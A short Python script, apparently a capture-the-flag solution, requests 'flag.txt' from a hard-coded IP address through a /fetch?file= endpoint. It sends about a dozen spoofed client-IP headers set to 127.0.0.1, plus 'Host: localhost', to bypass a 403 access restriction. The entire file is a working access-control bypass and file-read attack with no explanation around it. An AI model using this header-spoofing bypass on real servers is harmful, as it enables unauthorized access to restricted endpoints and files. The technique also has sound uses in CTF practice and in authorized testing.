#!/usr/bin/env python

import requests

target = "http://66.228.53.87:8989"
file = "flag.txt"

# 403 bypass
headers = {
    'X-Originating-IP': '127.0.0.1',
    'X-Forwarded-For': '127.0.0.1',
    'X-Forwarded': '127.0.0.1',
    'Forwarded-For': '127.0.0.1',
    'X-Remote-IP': '127.0.0.1',
    'X-Remote-Addr': '127.0.0.1',
    'X-ProxyUser-Ip': '127.0.0.1',
    'X-Original-URL': '127.0.0.1',
    'Client-IP': '127.0.0.1',
    'True-Client-IP': '127.0.0.1',
    'Cluster-Client-IP': '127.0.0.1',
    'X-ProxyUser-Ip': '127.0.0.1',
    'Host': 'localhost'
}

req = requests.get(f'{target}/fetch?file={file}', headers=headers)

print(req.text)
